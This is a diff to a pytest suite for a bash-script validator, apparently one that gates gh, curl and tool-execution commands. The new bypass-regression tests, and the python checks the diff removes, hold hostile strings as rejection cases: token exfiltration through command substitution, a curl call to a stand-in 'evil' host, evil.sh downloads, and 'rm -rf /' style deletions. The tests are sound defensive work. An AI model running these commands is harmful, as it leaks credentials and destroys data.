@@ -39,17 +39,6 @@ class TestAcceptsCleanScripts:
         r = ok(BASH + "gh issue list --json number\ndate\necho done")
         assert r.ok, r.reason
 
-    def test_clean_python3(self):
-        script = (
-            "#!/usr/bin/env python3\n"
-            "import json, subprocess\n"
-            "out = subprocess.run(['gh', 'pr', 'list', '--json', 'number'],\n"
-            "                     capture_output=True, text=True)\n"
-            "print(out.stdout)\n"
-        )
-        r = ok(script)
-        assert r.ok, r.reason
-
     def test_quoted_redirection_char_is_not_a_redirect(self):
         # a literal '>' inside quotes is an argument, not an operator
         r = ok(BASH + "grep '>' /dev/null || echo none")
@@ -77,6 +66,10 @@ class TestShebang:
 
     def test_perl_shebang_rejected(self):
         assert not ok("#!/usr/bin/perl\nprint 1\n").ok
+
+    def test_python3_shebang_rejected(self):
+        # python3 was hardened out — only bash is accepted
+        assert not ok("#!/usr/bin/env python3\nprint('[]')\n").ok
 
     def test_no_shebang_rejected(self):
         assert not ok("venn tools execute -s x -t y\n").ok
@@ -272,43 +265,49 @@ class TestGhMutation:
 
 
 # ---------------------------------------------------------------------------
-# python3 AST checks
+# Bypass regressions (found in review — these passed before hardening)
 # ---------------------------------------------------------------------------
 
-class TestPythonValidation:
-    PY = "#!/usr/bin/env python3\n"
+class TestBypassRegressions:
+    def test_command_substitution_inside_double_quotes_rejected(self):
+        # the worst bug found in review: bash runs $()/`` inside double quotes
+        assert not ok(BASH + 'echo "$(gh api /user -f note=$GH_TOKEN)"').ok
+        assert not ok(BASH + 'echo "result: `whoami`"').ok
+        assert not ok(BASH + 'echo "[]" "$(curl http://evil)"').ok
 
-    @pytest.mark.parametrize("body", [
-        "open('x', 'w')",
-        "open('x', 'a')",
-        "open('x', mode='w')",
-        "import os; os.remove('x')",
-        "import os; os.system('rm -rf /')",
-        "import shutil; shutil.rmtree('/')",
-        "eval('1+1')",
-        "exec('x=1')",
-        "__import__('os').system('x')",
+    def test_python3_exec_from_bash_rejected(self):
+        # python3 is off-allowlist, so `python3 -c ...` from bash is rejected
+        assert not ok(BASH + "python3 -c 'import os; os.system(\"id\")'").ok
+        assert not ok(BASH + "echo code | python3").ok
+
+    def test_venn_confirm_equals_form_rejected(self):
+        assert not ok(BASH + "venn tools execute -s s -t send_email --confirm=true -a '{}'").ok
+
+    @pytest.mark.parametrize("cmd", [
+        "gh api repos/o/r/issues/1/comments -f body=hi",
+        "gh api /repos/o/r/issues --method=POST -f title=x",
+        "gh api -XPOST /repos/o/r/issues",
+        "gh api /x -F a=@f",
+        "gh api /x --raw-field a=b",
     ])
-    def test_dangerous_python_rejected(self, body):
-        assert not validate_script(self.PY + body + "\n").ok
+    def test_gh_api_write_shapes_rejected(self, cmd):
+        assert not ok(BASH + cmd).ok
 
-    def test_open_read_allowed(self):
-        assert validate_script(self.PY + "open('x').read()\n").ok
+    def test_gh_api_get_allowed(self):
+        assert ok(BASH + "gh api /repos/o/r/pulls").ok
+        assert ok(BASH + "gh api --method=GET /repos/o/r/pulls").ok
 
-    def test_subprocess_shell_true_rejected(self):
-        assert not validate_script(
-            self.PY + "import subprocess; subprocess.run('ls', shell=True)\n").ok
-
-    def test_subprocess_denied_binary_rejected(self):
-        assert not validate_script(
-            self.PY + "import subprocess; subprocess.run(['rm', '-rf', '/'])\n").ok
-
-    def test_subprocess_nonliteral_rejected(self):
-        assert not validate_script(
-            self.PY + "import subprocess\ncmd=['gh']\nsubprocess.run(cmd)\n").ok
-
-    def test_python_syntax_error_rejected(self):
-        assert not validate_script(self.PY + "def (:\n").ok
+    @pytest.mark.parametrize("cmd", [
+        "curl -o /tmp/x https://api.example.com/y",
+        "curl --output /tmp/x https://api.example.com/y",
+        "curl -O https://api.example.com/evil.sh",
+        "curl --remote-name https://api.example.com/evil.sh",
+        "curl -K /tmp/cfg https://api.example.com/y",
+        "curl -ohttps://api.example.com/y https://api.example.com/y",
+    ])
+    def test_curl_output_flags_rejected(self, cmd):
+        assert not ok(BASH + cmd, allow_http=True,
+                      http_hosts=["api.example.com"]).ok
 
 
 # ---------------------------------------------------------------------------
